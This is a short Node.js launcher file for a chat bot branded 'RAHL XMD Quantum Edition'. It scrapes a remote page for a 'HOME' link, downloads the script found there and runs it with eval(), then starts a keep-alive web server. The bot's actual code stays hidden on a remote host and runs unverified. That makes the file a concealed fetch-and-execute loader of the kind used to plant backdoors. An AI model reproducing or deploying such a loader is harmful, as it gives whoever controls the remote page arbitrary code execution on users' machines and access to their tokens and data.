//  [RAHL XMD QUANTUM EDITION ⚡]                                           
//  >> A convergence of dark royal intelligence and quantum logic
//  >> Forged by Lord Rahl 👑                                                
//  >> Version: 9.0.0-quantum.rahl                                         

const axios = require('axios');
const cheerio = require('cheerio');
const express = require('express');

// 🧠 Import the hybrid config system
const { hybridConfig, BOT_NAME, OWNER_NAME, PREFIX, GURL } = require('./core');

// ==================================
// 👑 Dynamic Engine Loader
// ==================================
async function fetchHomeUrl() {
  try {
    const homeURL = GURL; // from core.js (You can change to RAHL_XMD if defined)
    const response = await axios.get(homeURL);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("HOME")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('⚠️ HOME link not found — the royal script cannot awaken.');
    }

    console.log(`👑 ${BOT_NAME} initialized under Lord ${OWNER_NAME}`);
    console.log(`⚡ Prefix: ${PREFIX}`);
    console.log('🚀 Fetching royal intelligence core...');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('❌ Error loading RAHL XMD core:', error.message);
  }
}

// 🌀 Activate the bot
fetchHomeUrl();

// ===============================
// ⚡ Render Keep-Alive Server ⚡
// ===============================
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send(`👑 ${BOT_NAME} Quantum Bot is alive and ruling the Render realm!`);
});

app.listen(PORT, () => {
  console.log(`✅ Keep-alive server active on port ${PORT}`);
});
